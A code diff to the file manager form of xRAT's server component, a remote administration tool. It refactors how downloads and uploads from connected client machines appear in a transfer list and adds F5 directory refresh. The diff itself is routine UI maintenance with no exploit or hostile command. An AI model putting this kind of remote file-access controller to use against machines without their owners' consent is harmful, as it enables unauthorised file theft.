@@ -6,6 +6,7 @@ using System.Linq;
 using System.Threading;
 using System.Windows.Forms;
 using xServer.Core.Commands;
+using xServer.Core.Extensions;
 using xServer.Core.Helper;
 using xServer.Core.Misc;
 using xServer.Core.Networking;
@@ -28,6 +29,11 @@ namespace xServer.Forms
 
             _lvwColumnSorter = new ListViewColumnSorter();
             lstDirectory.ListViewItemSorter = _lvwColumnSorter;
+
+            lstDirectory.RemoveDots();
+            lstDirectory.ChangeTheme();
+            lstTransfers.RemoveDots();
+            lstTransfers.ChangeTheme();
         }
 
         private string GetAbsolutePath(string item)
@@ -107,12 +113,7 @@ namespace xServer.Forms
                     {
                         new Core.Packets.ServerPackets.DoDownloadFile(path, id).Execute(_connectClient);
 
-                        this.Invoke((MethodInvoker) delegate
-                        {
-                            ListViewItem lvi =
-                                new ListViewItem(new string[] { id.ToString(), "Downloading...", files.SubItems[0].Text });
-                            lstTransfers.Items.Add(lvi);
-                        });
+                        AddTransfer(id, "Downloading...", files.SubItems[0].Text);
                     }
                 }
             }
@@ -310,21 +311,9 @@ namespace xServer.Forms
 
                         if (string.IsNullOrEmpty(path)) return;
 
-                        try
-                        {
-                            this.Invoke((MethodInvoker) delegate
-                            {
-                                ListViewItem lvi =
-                                    new ListViewItem(new string[]
-                                    {id.ToString(), "Uploading...", Path.GetFileName(path)});
-                                lstTransfers.Items.Add(lvi);
-                            });
-                        }
-                        catch (InvalidOperationException)
-                        {
-                        }
+                        AddTransfer(id, "Uploading...", Path.GetFileName(path));
 
-                        int index = GetTransferIndex(id.ToString());
+                        int index = GetTransferIndex(id);
                         if (index < 0)
                             return;
 
@@ -374,6 +363,16 @@ namespace xServer.Forms
                         UpdateTransferStatus(index, "Completed", 1);
                     }).Start();
                 }
+            }
+        }
+
+        private void FrmFileManager_KeyDown(object sender, KeyEventArgs e)
+        {
+            if (e.KeyCode == Keys.F5 && !string.IsNullOrEmpty(_currentDir) && TabControlFileManager.SelectedIndex == 0)
+            {
+                // refresh with F5
+                new Core.Packets.ServerPackets.GetDirectory(_currentDir).Execute(_connectClient);
+                e.Handled = true;
             }
         }
 
@@ -442,15 +441,39 @@ namespace xServer.Forms
             }
         }
 
-        public int GetTransferIndex(string id)
+        public void AddTransfer(int id, string status, string filename)
         {
+            try
+            {
+                lstDirectory.Invoke((MethodInvoker)delegate
+                {
+                    ListViewItem lvi =
+                        new ListViewItem(new string[] { id.ToString(), status, filename });
+                    lstTransfers.Items.Add(lvi);
+                });
+            }
+            catch (InvalidOperationException)
+            {
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(
+                    string.Format(
+                        "An unexpected error occurred: {0}\n\nPlease report this as fast as possible here:\\https://github.com/MaxXor/xRAT/issues",
+                        ex.Message), "", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+        }
+
+        public int GetTransferIndex(int id)
+        {
+            string strId = id.ToString();
             int index = 0;
 
             try
             {
                 lstTransfers.Invoke((MethodInvoker)delegate
                 {
-                    foreach (ListViewItem lvi in lstTransfers.Items.Cast<ListViewItem>().Where(lvi => lvi != null && id == lvi.SubItems[0].Text))
+                    foreach (ListViewItem lvi in lstTransfers.Items.Cast<ListViewItem>().Where(lvi => lvi != null && strId.Equals(lvi.SubItems[0].Text)))
                     {
                         index = lvi.Index;
                         break;
